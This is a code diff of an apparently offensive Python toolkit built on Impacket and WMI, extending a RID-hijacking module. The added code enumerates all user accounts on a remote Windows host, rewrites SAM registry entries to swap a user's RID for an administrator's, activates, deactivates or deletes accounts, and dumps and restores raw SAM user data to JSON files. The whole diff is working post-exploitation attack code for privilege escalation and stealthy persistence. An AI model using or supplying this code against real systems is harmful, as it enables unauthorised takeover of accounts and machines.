@@ -2,6 +2,9 @@ import sys
 import numpy
 import base64
 import uuid
+import json
+import time
+import os
 
 from lib.methods.executeVBS import executeVBS_Toolkit
 from lib.modules.exec_command import EXEC_COMMAND
@@ -12,29 +15,36 @@ class RID_Hijack_Toolkit():
         self.iWbemLevel1Login = iWbemLevel1Login
         self.dcom = dcom
 
-    def query_user(self, username):
+    def save_ToFile(self, hostname, rid, content):
+        path = 'save/'+hostname
+        save_FileName = "RID-{}-{}.json".format(rid, str(int(time.time())))
+        if os.path.exists(path) == False:
+            os.makedirs(path, exist_ok=True)
+        
+        with open("{}/{}".format(path, save_FileName), 'w') as f: f.write(content)
+        print("[+] Save user profile data to: {}/{}".format(path, save_FileName))
+
+    def query_user(self):
         iWbemServices = self.iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
         self.iWbemLevel1Login.RemRelease()
         
-        try:
-            iEnumWbemClassObject = iWbemServices.ExecQuery('SELECT Name, SID, Disabled, PasswordExpires, PasswordChangeable, PasswordRequired FROM Win32_UserAccount where Name="%s"' %username)
-            Users_Info = iEnumWbemClassObject.Next(0xffffffff,1)[0]
-        except Exception as e:
-            if "WBEM_S_FALSE" in str(e):
-                print("[-] User not existed!")
-            else:
-                print("[-] Unexpected error: %s"%str(e))
-            self.dcom.disconnect()
-            sys.exit(0)
-        else:
-            print('[+] Get user information: Name: {}, SID: {}, Disabled: {}, PasswordExpires: {}, PasswordChangeable: {}, PasswordRequired: {}'.format(
-                Users_Info.Name,
-                Users_Info.SID,
-                Users_Info.Disabled,
-                Users_Info.PasswordExpires,
-                Users_Info.PasswordChangeable,
-                Users_Info.PasswordRequired
-            ))
+        iEnumWbemClassObject = iWbemServices.ExecQuery('SELECT Name, SID, Disabled, PasswordExpires, PasswordChangeable, PasswordRequired FROM Win32_UserAccount')
+        while True:
+            try:
+                Users_Info = iEnumWbemClassObject.Next(0xffffffff,1)[0]
+                print('[+] Get user information: Name: {}, SID: {}, Disabled: {}, PasswordExpires: {}, PasswordChangeable: {}, PasswordRequired: {}'.format(
+                    Users_Info.Name,
+                    Users_Info.SID,
+                    Users_Info.Disabled,
+                    Users_Info.PasswordExpires,
+                    Users_Info.PasswordChangeable,
+                    Users_Info.PasswordRequired
+                ))
+            except Exception as e:
+                if str(e).find('S_FALSE') < 0:
+                    pass
+                else:
+                    break
         iWbemServices.RemRelease()
 
     def Permissions_Controller(self, action, hijack_Target):
@@ -100,43 +110,49 @@ class RID_Hijack_Toolkit():
                 print('[-] Unknown error: %s'%(str(e)))
             iWbemServices.RemRelease()
         else:
-            # Impacket will return native integer list like this:
-            # [3, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255,255, 255, 255, 127, 0, 0, 0, 0, 0, 0, 0, 0, 245, 1, 0, 0, 1, 2, 0, 0, 20, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,0, 0, 0, 52, 0, 52, 0, 0, 0]
-            #
-            # This is native binary strings, so we need to conver it to this first like this (every four integer add to a list)
-            # [03, 00, 01, 00],[00, 00, 00, 00]....
-            #
-            # Next, reverse the list and combine it, the convert to integer
-            # [00, 01, 00, 03] to 00010003(hex) to 65539(int)
-            #
-            # Finally, to will get a integer list, but the length of the list is less than 80, so we need to append zero until to length is match 80
-            raw_value = numpy.array_split(raw_value.uValue, 20)
-            result=[]
-            for i in raw_value:
-                raw = ""
-                for j in list(i[::-1]):
-                    raw+="%.2x"%j
-                result.append(eval("0x{}".format(raw)))
-            
-            # Appending zero
-            result.extend([0]*(80-len(result)))
+            if action != "remove":
+                # Impacket will return native integer list like this:
+                # [3, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255,255, 255, 255, 127, 0, 0, 0, 0, 0, 0, 0, 0, 245, 1, 0, 0, 1, 2, 0, 0, 20, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,0, 0, 0, 52, 0, 52, 0, 0, 0]
+                #
+                # This is native binary strings, so we need to conver it to this first like this (every four integer add to a list)
+                # [03, 00, 01, 00],[00, 00, 00, 00]....
+                #
+                # Next, reverse the list and combine it, the convert to integer
+                # [00, 01, 00, 03] to 00010003(hex) to 65539(int)
+                #
+                # Finally, to will get a integer list, but the length of the list is less than 80, so we need to append zero until to length is match 80
+                raw_value = numpy.array_split(raw_value.uValue, 20)
+                result=[]
+                for i in raw_value:
+                    raw = ""
+                    for j in list(i[::-1]):
+                        raw+="%.2x"%j
+                    result.append(eval("0x{}".format(raw)))
+                
+                # Appending zero
+                result.extend([0]*(80-len(result)))
 
-            # Index 12 is rid
-            if action == "hijack":
-                result[12] = int(hijack_RID)
-                print('[+] Hijacking user from RID: %s to RID: %s'%(hijack_Target, hijack_RID))
+                # Index 12 is rid
+                if action == "hijack":
+                    result[12] = int(hijack_RID)
+                    print('[+] Hijacking user from RID: %s to RID: %s'%(hijack_Target, hijack_RID))
 
-            # Enable user index 14 = 532, disable is 533
-            elif action == "activate":
-                result[14] = 532
-                print("[+] Activate target user.")
-            elif action == "deactivate":
-                result[14] = 533
-                print("[+] Deactivate target user.")
+                # Enable user index 14 = 532, disable is 533
+                elif action == "activate":
+                    result[14] = 532
+                    print("[+] Activate target user.")
+                elif action == "deactivate":
+                    result[14] = 533
+                    print("[+] Deactivate target user.")
+                
+                StdRegProv.SetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(hijack_Target)), 16), '08x')), 'F', result)
+                
+            else:
+                print("[+] Remove user.")
+                StdRegProv.DeleteKey(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(hijack_Target)), 16), '08x')))
             
-            StdRegProv.SetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(hijack_Target)), 16), '08x')), 'F', result)
             iWbemServices.RemRelease()
-        
+
     # For Guest user
     def BlankPasswordLogin(self, action):
         iWbemServices = self.iWbemLevel1Login.NTLMLogin('//./root/DEFAULT', NULL, NULL)
@@ -149,3 +165,49 @@ class RID_Hijack_Toolkit():
             StdRegProv.SetDWORDValue(2147483650, 'SYSTEM\\CurrentControlSet\\Control\\Lsa', 'LimitBlankPasswordUse', 1)
             print('[+] Disable blank password login.')
         iWbemServices.RemRelease()
+
+    def backup_UserProfile(self, rid, hostname):
+        iWbemServices = self.iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
+        self.iWbemLevel1Login.RemRelease()
+        StdRegProv, resp = iWbemServices.GetObject("StdRegProv")
+        value_Name = StdRegProv.EnumValues(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(rid)), 16), '08x')))
+        backup_Dict = {
+            'user-RID':int(rid),
+            'key-Value':[]
+        }
+        for valueName in value_Name.sNames:
+            value_Dict = {}
+            raw_value = StdRegProv.GetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(rid)), 16), '08x')), valueName)
+            raw_value_length = len(raw_value.uValue)
+            raw_value = numpy.array_split(raw_value.uValue, (raw_value_length / 4))
+            result=[]
+            for i in raw_value:
+                raw = ""
+                for j in list(i[::-1]):
+                    raw+="%.2x"%j
+                result.append(eval("0x{}".format(raw)))
+            
+            # Appending zero
+            result.extend([0]*(raw_value_length - len(result)))
+            
+            # Add to dict
+            value_Dict['valueName'] = valueName
+            value_Dict['length'] = raw_value_length
+            value_Dict['data'] = result
+            
+            # Save to final dict
+            backup_Dict['key-Value'].append(value_Dict)
+        
+        self.save_ToFile(hostname, rid, json.dumps(backup_Dict, indent=4))
+
+    def restore_UserProfile(self, file):
+        with open(file) as json_Data:
+            data = json.load(json_Data)
+        iWbemServices = self.iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
+        self.iWbemLevel1Login.RemRelease()
+        StdRegProv, resp = iWbemServices.GetObject("StdRegProv")
+        StdRegProv.CreateKey(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(data['user-RID'])), 16), '08x')))
+        for i in data['key-Value']:
+            StdRegProv.SetBinaryValue(2147483650, 'SAM\\SAM\\Domains\\Account\\Users\\%s'%str(format(int(hex(int(data['user-RID'])), 16), '08x')), i['valueName'], i['data'])
+
+        print("[+] User with RID:{} restore successful!".format(data['user-RID']))
